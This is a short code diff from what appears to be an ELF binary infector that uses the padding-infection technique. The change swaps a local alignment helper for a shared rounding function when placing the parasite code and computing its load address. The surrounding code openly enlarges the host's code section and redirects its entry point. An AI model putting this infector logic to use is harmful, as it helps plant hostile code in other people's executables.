@@ -1,5 +1,6 @@
 #include "infector/padding_infect.hh"
 #include "common/macros.hh"
+#include "common/math.hh"
 #include "common/patch_pattern.hh"
 #include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
@@ -7,9 +8,6 @@
 
 namespace vt::infector {
 namespace {
-
-uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & ~(4 - 1)) + 4; }
-
 // Patch SHT (i.e. find the last section of CODE segment and increase its size
 // by parasite_size)
 bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
@@ -91,9 +89,9 @@ bool PaddingInfect::analyze(std::span<const std::byte> host_mapping,
       // Sometimes the last section in CODE is .data. Make sure the parasite
       // start address is word aligned for arm. X86-64 has no such requirements.
       parasite_file_offset =
-          next_32_bit_aligned_addr(code_segment_last_byte_offset);
-      parasite_load_address = next_32_bit_aligned_addr(
-          phdr_entry->p_vaddr + phdr_entry->p_filesz - 1);
+          common::round_up_to(code_segment_last_byte_offset, 4);
+      parasite_load_address = common::round_up_to(
+          phdr_entry->p_vaddr + phdr_entry->p_filesz - 1, 4);
       continue;
     }
 
